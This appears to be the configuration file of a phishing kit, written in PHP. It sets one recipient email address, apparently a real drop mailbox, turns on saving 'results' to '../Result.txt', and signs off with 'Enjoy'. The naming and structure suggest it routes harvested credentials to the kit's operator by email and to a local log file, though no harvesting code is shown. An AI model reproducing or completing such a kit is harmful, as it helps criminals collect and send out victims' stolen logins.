<?php

// One Email
$TO = "dibarezult@yandex.com";

// Save result to file   True or False
$Res2File = true;

//Result File Name
$ResFileName = "../Result.txt";

// Enjoy